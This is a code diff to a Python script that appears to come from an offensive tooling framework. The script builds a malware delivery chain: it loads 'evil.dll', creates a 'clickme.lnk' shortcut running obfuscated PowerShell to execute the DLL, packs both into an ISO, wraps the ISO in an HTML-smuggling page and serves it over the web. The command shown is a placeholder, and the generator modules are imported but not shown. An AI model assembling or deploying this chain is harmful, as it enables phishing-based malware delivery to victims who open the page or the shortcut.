@@ -1,33 +1,23 @@
 from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
 from make.lnk.lnk import makeLnk
 from make.iso.iso import makeIso
+from obfuscate.powershell.obfuscatepowershell import obfuscatePowershell
 
+from helpers import readFileContent, saveAceFile
 from model import AceFile, AceRoute
 from web import serve
 
-def readFile(filename):
-    data = b'readFile.dll'
-    return data
-
-
-def obfuscatePowershell(input, options):
-    return "{}".format(input)
-
-def makeVbs(input):
-    pass
-
-def makeJs():
-    pass
-
 
 def main():
-    payloadData = readFile('evil.dll')
+    # DLL
+    payloadData = readFileContent('payloads/evil.dll')
     payloadFile = AceFile('evil.dll', payloadData)
     
+    # LNK to powershell.exe to execute DLL
     payloadExecData = 'ls evil.dll'
     payloadExecData = obfuscatePowershell(
         input=payloadExecData,
-        options = {},
+        options={},
     )
     payloadExec = makeLnk(
         name = "clickme.lnk",
@@ -36,21 +26,24 @@ def main():
     )
     payloadExeFile = AceFile('clickme.lnk', payloadExec)
 
+    # Pack DLL and LNK into ISO
     container = makeIso(
         files = [
             payloadFile,
             payloadExeFile,
         ],
     )
-    containerFile = AceFile('test.iso', container)
+    containerFile = AceFile('test2.iso', container)
 
+    # HTML to serve ISO
     html = makeHtmlSmuggling(
         containerFile,
     )
 
-    serveHtml = AceRoute('/test', html)
+    # serve HTML
+    serveHtml = AceRoute('/test2', html)
     serve([serveHtml])
 
-    #print(html)
 
-main()
+if __name__ == "__main__":
+    main()
